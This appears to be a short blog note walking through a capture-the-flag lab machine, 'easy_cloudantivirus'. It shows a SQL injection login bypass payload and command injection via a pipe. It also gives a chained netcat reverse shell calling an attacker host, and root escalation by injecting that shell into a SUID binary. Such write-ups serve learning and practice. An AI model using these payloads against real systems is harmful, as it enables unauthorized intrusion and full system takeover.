---
layout: post
title: easy_cloudantivirus
date: 2022-02-01
tag: notes
---
*   sql injection
*   nc  series connection (while nc have no -e flag)
*   command line argument manipulate

##  192.168.1.216

1.  `nmap` python web server on 8080 port
2.  `dirsearch` find two other directory but no further usage
3.  `burp`  use POST request to 192.168.1.216/login page, return with sql error page
4.  `sql injection` found in code
5.  `1" OR 1=1--+` redirect to 192.168.1.216/scan page

##  192.168.1.216/scan

1.  Assmue running 
    ```sh 
    ./app input 
    ```
2.  `Command execution` Use input `a | id`, found output is `id=(scanner)`

3.  `Get a shell` by 
    ```sh 
    a | nc [ip] [port] | /bin/bash | nc [ip] [another port]
    ```

## Scanner

1.  found suid bin cloud_av, as well as its source code cloud_av.c 
    ```sh
    cloud_av command
    ```
2.  It will use root to run `freshclam command`

3.  `Reverse shell`
    ```sh
    ./cloud_av "a | nc nc [ip] [port] | /bin/bash | nc [ip] [another port]"
    ```

##  We got a root!